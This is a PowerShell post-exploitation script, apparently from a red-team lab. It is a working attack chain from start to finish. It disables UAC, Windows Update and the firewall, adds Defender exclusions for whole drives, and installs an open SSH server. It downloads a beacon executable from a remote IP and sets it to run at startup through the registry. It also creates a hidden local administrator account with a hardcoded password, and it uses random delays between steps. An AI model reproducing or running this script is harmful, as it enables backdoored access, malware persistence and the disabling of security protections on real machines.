# Function to generate a random number and add it to a predefined array
function Add-RandomNumberToArray {
    # Access the array from the script scope
    $global:randomNumbersArray += Get-Random -Minimum 1 -Maximum 101
}

# Initialize an empty array
$global:randomNumbersArray = @()

# Use a loop to add random numbers to the array
for ($i = 0; $i -lt 8; $i++) {
    Add-RandomNumberToArray
}

function CheckAdminPrivilege{
    Write-Host "$($global:randomNumbersArray[0])"

        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $isAdmin = (New-Object Security.Principal.WindowsPrincipal $currentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) 
        Write-Host "[+] $isAdmin"
    if($isAdmin){
    
            Write-Host "[+] User Already has admin privileges"
            #Add Exclusion

            foreach($exclusionFile in $exclusionFiles){
            if ((Get-MpPreference).ExclusionPath -contains $exclusionFile){
                Write-Host "[+] Exclusion File Already UP"
            }else{
                Add-MpPreference -ExclusionPath $exclusionFile
                Write-Host "[+] Exclusion File has Added"
            }
        }
    }else{
            New-Item -ItemType Directory -Path "$env:USERPROFILE\temp"
            Get-LocalUser | Select *  > "$env:USERPROFILE\temp\UserInformation.txt"
            ipconfig /all > "$env:USERPROFILE\temp\IPRoute.txt"
            systeminfo > "$env:USERPROFILE\temp\SystemInfo.txt"
            Write-Host "[+] User didn't had admin privileges"
    }      
}

# Function Defense Evasion
function DefenseEvasion{
    #Disable Windows Updates, Disable Win Def and Disable Firewall 
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
    sc.exe config wuauserv start= disabled
    sc.exe stop wuauserv
    REG.exe QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv /v Start 

    $firewallProfiles = Get-NetFirewallProfile

    foreach ($profile in $firewallProfiles) {
        if ($profile.Enabled) {
            Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False 
            Write-Host "$($profile.Name) Firewall has been Disable."
        
        } else {
            Write-Host "$($profile.Name) Firewall already disabled."
        }
    }

}

function Installsshd{
    Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

    # Start the sshd service
    Start-Service sshd
    # OPTIONAL but recommended:
    Set-Service -Name sshd -StartupType 'Automatic'
    # Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
    if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
        Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
        New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
    } else {
        Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
    }
}
#Function for File Installation
function InstallationFiles {
    #Add C:\Temp Path
    if(Test-Path -Path "C:\Temp"){
        Write-Host "[+] Directory Exist"
    }else{
        New-Item -ItemType Directory -Path "C:\Temp"
        Write-Host "[+] Adding Directory "
    }

    #Installing file
    if (Test-NetConnection -ComputerName $Server -Port $Port) {
        Write-Host "Connection to 'http://$Server' on port $Port successful!"
        foreach ($RequireFile in $RequireFiles) {
            Write-Host "[+] Requesting file: $RequireFile"
            $url = "http://${Server}:$Port/testing/$RequireFile"
            $filePath = "C:\Temp\$RequireFile"
            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $filePath
        }
    } else {
        Write-Host "[+] Unable to connect to 'http://$Server' on port $Port."
    }
    
}

function Persistence {
    # Create Persistence beacon
    $uri = "http://192.168.245.132:8085/testing/beacon_x264.exe"
    $executablePath = "C:\Temp\beacon_x264.exe"
    $registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $registryValueName = "BeaconX264"
    $registryValueData = "$executablePath"

    # Check if the executable exists, if not download it
    if (-Not (Test-Path -Path $executablePath)) {
        Invoke-WebRequest -Uri $uri -OutFile $executablePath
        Write-Host "[+] Downloaded $executablePath"
    }

    # Add or update the registry key
    if (-Not (Get-ItemProperty -Path $registryPath -Name $registryValueName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $registryPath -Name $registryValueName -Value $registryValueData -PropertyType String -Force
        Write-Host "[+] Added registry key: $registryValueName"
    } else {
        Set-ItemProperty -Path $registryPath -Name $registryValueName -Value $registryValueData
        Write-Host "[+] Updated registry key: $registryValueName"
    }
}

function CreatedUser{
    #Create new local administrator 
    $Username = "hacked"
    $RegPathForLogin = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\WinLogon"
    $NewRegPathForLogin = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts"
   
    if (Get-LocalUser -Name $Username) {
        Write-Host "[+] there is user hacked here!!"
    }else{
        net user $Username "hacked123." /add 
        net localgroup Administrators $Username /ADD
        Write-Host "[+] Adding user hacked"
    }

    # Create the SpecialAccounts key if it doesn't exist
    if (-not (Test-Path -Path $NewRegPathForLogin)) {
    New-Item -Path $RegPathForLogin -Name "SpecialAccounts"
    }   

    # Create the UserList key if it doesn't exist
    $UserListPath = "$NewRegPathForLogin\UserList"
    if (-not (Test-Path -Path $UserListPath)) {
    New-Item -Path $NewRegPathForLogin -Name "UserList"
    }

# Add the username as a DWORD value under UserList
    New-ItemProperty -Path $UserListPath -Name $Username -Value 0 -PropertyType "Dword" -Force
    Write-Host "[+] User hacked has been added and hide on login startup"
}


#Main function

#Variable Declaration
$exclusionFiles = @("C:\","D:\")
$RequireFiles = @("beacon_x264.exe")
$Server = "192.168.245.132"
$port = "8085"
###End###

CheckAdminPrivilege
Start-Sleep -Seconds $($global:randomNumbersArray[0])
Installsshd
Start-Sleep -Seconds $($global:randomNumbersArray[1]) 
DefenseEvasion
Start-Sleep -Seconds $($global:randomNumbersArray[2]) 
InstallationFiles
Start-Sleep -Seconds $($global:randomNumbersArray[3]) 
Persistence
Start-Sleep -Seconds $($global:randomNumbersArray[4]) 
CreatedUser
#End of main
